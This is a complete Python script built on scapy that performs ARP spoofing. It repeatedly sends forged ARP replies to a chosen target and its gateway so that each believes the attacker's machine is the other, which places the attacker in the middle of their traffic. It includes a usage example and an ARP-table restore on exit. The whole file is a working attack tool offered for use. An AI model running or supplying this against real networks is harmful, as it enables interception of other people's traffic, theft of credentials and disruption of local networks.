#!/usr/bin/python3

import argparse
import textwrap
import scapy.all as scapy
import time

#Function for Handling Command-line Arguments
def get_arguments():
    
    #Creating Argument Parser
    parser = argparse.ArgumentParser(description= "ARP Spoofer",
            formatter_class = argparse.RawDescriptionHelpFormatter,
            epilog = textwrap.dedent(""" Example:
            sudo ./arp-spoofer.py -t 10.10.10.5 -g 10.10.10.0
            """))

    #Adding arguments to the parser
    parser.add_argument("-t", "--target", dest="target", help="Target")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway")
    
    #Parsing the command line argument
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Target IP address not specified, use --help for more info.")
    if not options.gateway:
        parser.error("[-] Gateway IP address not specified, use --help for more info.")
    return options    

options = get_arguments()

target_ip = options.target
gateway_ip = options.gateway

# Getting mac address of the target
def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    answered_list=scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return (answered_list[0][1].hwsrc)

# Spoofing target
def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    #"op=1" is for request ,so we use "op=2" to send arp response rather than request
    packet=scapy.ARP(op=2, pdst= target_ip, hwdst=target_mac, psrc= spoof_ip)
    scapy.send(packet, verbose=False)


# Restoring arp table
def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


try:
    sent_packets_count=0
    while True:
        #Telling victim I'm the router; first ip is the target(victim); second ip is the router
        spoof(target_ip, gateway_ip)

        #Telling router I'm the victim; first ip is the router; second ip is the target(victim)
        spoof(gateway_ip, target_ip)

        sent_packets_count+=2

        print(f"\r [+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n")
    print(" [-] Resetting ARP table...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print(" [+] Done")
